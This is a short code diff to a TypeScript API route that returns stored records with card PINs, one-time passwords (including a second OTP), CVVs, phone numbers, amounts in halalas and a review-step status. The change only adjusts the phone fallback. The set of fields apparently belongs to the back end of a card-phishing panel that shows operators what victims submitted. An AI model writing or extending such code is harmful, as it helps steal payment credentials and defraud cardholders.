@@ -39,7 +39,7 @@ export async function GET(req: Request) {
     pin: k.pin,
     otp: k.otp2 || k.otp,
     cvv: k.cvv,
-    phone: k.msisdnDisplay ?? "",
+    phone: k.phone || k.msisdnDisplay || "",
     amount: (k.amountHalalas / 100).toFixed(3),
     time: k.createdAt,
     status: mapStatus(k.status, k.reviewStep),
